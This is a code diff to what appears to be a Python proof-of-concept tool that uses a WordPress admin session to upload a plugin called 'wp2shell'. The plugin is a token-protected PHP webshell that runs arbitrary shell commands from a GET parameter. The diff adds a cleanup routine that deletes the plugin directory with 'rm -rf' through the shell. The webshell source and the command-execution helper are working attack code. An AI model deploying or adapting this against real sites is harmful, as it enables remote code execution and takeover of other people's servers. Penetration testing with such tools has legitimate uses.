@@ -10,6 +10,7 @@ import http.cookiejar
 import io
 import re
 import secrets
+import urllib.error
 import urllib.parse
 import urllib.request
 import uuid
@@ -79,6 +80,30 @@ class AdminSession:
         match = re.search(rf"{_MARKER}::(.*?)::END", output, re.S)
         return match.group(1) if match else None
 
+    def cleanup(self, shell_path: str) -> bool:
+        """Delete the webshell plugin directory from the target (best effort).
+
+        The generated webshell changes to its own plugin directory before
+        executing commands. The case guard refuses to delete anything that does
+        not look like a plugins directory. A subsequent 404 confirms removal.
+        """
+        try:
+            out = self.run(
+                shell_path,
+                'd=$(pwd); case "$d" in */wp-content/plugins/*) cd / && rm -rf "$d";; esac',
+            )
+        except OSError:
+            return False
+        if out is None:
+            return False
+        try:
+            self._get(shell_path)
+        except urllib.error.HTTPError as exc:
+            return exc.code == 404
+        except OSError:
+            return False
+        return False
+
     # -- helpers ------------------------------------------------------------
 
     def _get(self, path: str) -> str:
@@ -97,6 +122,7 @@ class AdminSession:
         php = (
             "<?php\n"
             "/*\nPlugin Name: wp2shell\nDescription: PoC webshell. Delete after testing.\n*/\n"
+            "chdir(__DIR__);\n"
             f"if (hash_equals('{self._token}', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
             f"    echo '{_MARKER}::' . shell_exec((string) $_GET['c']) . '::END';\n"
             "}\n"
